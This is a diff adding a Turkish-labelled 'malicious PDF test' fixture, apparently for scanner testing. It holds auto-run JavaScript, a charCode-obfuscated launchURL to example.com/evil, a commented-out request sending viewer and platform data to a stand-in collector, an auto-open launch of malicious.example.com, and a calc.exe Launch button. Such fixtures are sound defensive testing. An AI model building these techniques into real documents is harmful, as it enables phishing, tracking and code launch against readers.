@@ -1,0 +1,115 @@
+%PDF-1.7
+%âãÏÓ
+1 0 obj
+<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R/Names 10 0 R/AA <</O 11 0 R>> >>
+endobj
+2 0 obj
+<</Type/Pages/Kids[4 0 R]/Count 1>>
+endobj
+3 0 obj
+<</Type/Action/S/JavaScript/JS(
+app.alert('Bu PDF dosyası potansiyel olarak zararlı JavaScript kodu içeriyor!', 3);
+var x = 'Bu bir test değişkenidir.';
+// Daha karmaşık zararlı olabilecek kodlar buraya eklenebilir
+// Örneğin, harici bir URL'ye istek gönderme veya sistem bilgilerini toplama
+// try {
+//  var viewerVersion = app.viewerVersion;
+//  var platform = app.platform;
+//  var docURL = this.URL;
+//  var data = 'Viewer: ' + viewerVersion + ', Platform: ' + platform + ', URL: ' + docURL;
+//  // Bu veriyi harici bir sunucuya gönderme (gerçek uygulamada yapılmamalıdır)
+//  // Net.HTTP.request({ cURL: \'\'\'http://example.com/collector?data=\'\'\' + encodeURIComponent(data), cVerb: \'\'\'GET\'\'\' });
+// } catch(e) {
+//  // Hata yönetimi
+// }
+this.exportDataObject({ cName: "test_export.txt", nLaunch: 2 });
+var maliciousCode = String.fromCharCode(97,112,112,46,108,97,117,110,99,104,85,82,76,40,39,104,116,116,112,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,101,118,105,108,39,41,59);
+// eval(maliciousCode); // Potansiyel olarak eval ile gizlenmiş kod
+)>>
+endobj
+4 0 obj
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 5 0 R/Annots [12 0 R 15 0 R]>>
+endobj
+5 0 obj
+<</Length 44>>
+stream
+BT
+/F1 24 Tf
+100 700 Td
+(Zararlı PDF Testi) Tj
+ET
+endstream
+endobj
+6 0 obj
+<</Type/EmbeddedFile/Params<</ModDate(D:20250606000000)/Size 2>>/Subtype/text#2Fplain/EF <</F 7 0 R>> >>
+stream
+Bu gömülü bir test dosyasıdır.
+endstream
+endobj
+7 0 obj
+<</Type/Filespec/F (embedded_file.txt)/UF (embedded_file.txt)/EF <</F 8 0 R>> >>
+endobj
+8 0 obj
+<</Length 30>>
+stream
+Bu başka bir gömülü dosya.
+endstream
+endobj
+9 0 obj
+<</Type/Action/S/Launch/Win <</F (calc.exe)>> >>
+endobj
+10 0 obj
+<</JavaScript <</Names [(launcher) 11 0 R]>> >>
+endobj
+11 0 obj
+<</S/JavaScript/JS (app.launchURL('http://malicious.example.com/tracker?id=123');)>>
+endobj
+12 0 obj
+<</Type/Annot/Subtype/Link/Rect[50 550 200 600]/Border[0 0 0]/A 13 0 R>>
+endobj
+13 0 obj
+<</Type/Action/S/URI/URI (http://risky-link.example.com)>>
+endobj
+14 0 obj
+<</Type/Action/S/GoToR/F <</Type/Filespec/F (external.pdf)>>/D (nameddest)>>
+endobj
+15 0 obj
+<</Type/Annot/Subtype/Widget/Rect[50 450 200 500]/FT/Btn/T(LaunchButton)/A 9 0 R>>
+endobj
+16 0 obj % Object Stream
+<</Type/ObjStm/N 2/First 12/Length 50>>
+stream
+17 0 <</S/JavaScript/JS(console.println("hidden");)>>
+18 0 <</Type/Font>>
+endstream
+endobj
+19 0 obj % Encrypt Dictionary
+<</Filter/Standard/V 4/R 4/O <FEEDBEEFCAFEDEADBEEFCAFEDEADBEEF>/U <CAFEDEADBEEFCAFEDEADBEEFCAFEDEAD>/P -1028/Length 128>>
+endobj
+xref
+0 20
+0000000000 65535 f 
+0000000015 00000 n 
+0000000098 00000 n 
+0000000157 00000 n 
+0000000712 00000 n 
+0000000790 00000 n 
+0000000868 00000 n 
+0000001002 00000 n 
+0000001078 00000 n 
+0000001150 00000 n 
+0000001212 00000 n 
+0000001288 00000 n 
+0000001380 00000 n 
+0000001468 00000 n 
+0000001560 00000 n 
+0000001650 00000 n 
+0000001750 00000 n 
+0000001850 00000 n 
+0000001950 00000 n 
+0000002050 00000 n 
+trailer
+<</Size 20/Root 1 0 R/Encrypt 19 0 R>>
+startxref
+2150
+%%EOF
